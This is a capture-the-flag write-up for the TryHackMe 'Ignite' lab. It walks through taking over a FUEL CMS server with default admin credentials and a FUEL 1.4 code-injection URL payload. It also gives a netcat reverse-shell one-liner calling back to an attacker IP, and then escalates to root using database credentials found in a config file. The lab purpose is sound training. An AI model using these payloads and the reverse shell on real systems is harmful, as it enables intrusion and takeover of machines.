# Ignite

[Ignite](https://tryhackme.com/room/ignite)

## Solution

- nmap scan 80

On the website there is a section

```
To access the FUEL admin, go to:
http://10.10.143.19/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)
```

and the credentials work.

First thing that jumped to me was to create a page with a php payload, but that
did not work. It kept showing the original page instead of what I was trying to
overwrite.

Next thing is to google `fuel 1.4 exploit` and we find
https://www.exploit-db.com/exploits/50477. I tried to copy paste in the url box
the string that is the payload in the script and it looks like it manages to
execute shell code.

```
http://<ip>/fuel/pages/select/?filter='+pi(print($a='system'))+$a('"whoami"')+'
```

but how does it work? TODO

Next we can spawn a revshell to make it easier to work with the machine. Run
the exploit script with the following command.

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.27.183 6969 >/tmp/f
```

Then we cd into /home/www-data and cat the flag.

For privesc I first tried to run linpeas, but it kept hanging. The next option
was to check for interesting files inside the application. An interesting
directory is located at `/var/www/html/fuel/application/config`. It contains
configuration for different stuff. We can just search trough each file and
check for passwords. Since we saw that there is a mysql user we can think that
maybe there are some passwords for that database. Inside the `database.php` is
an entry for `'username' => 'root'` and `'password' => 'mememe'`. We can try
this using `su`. And it works.
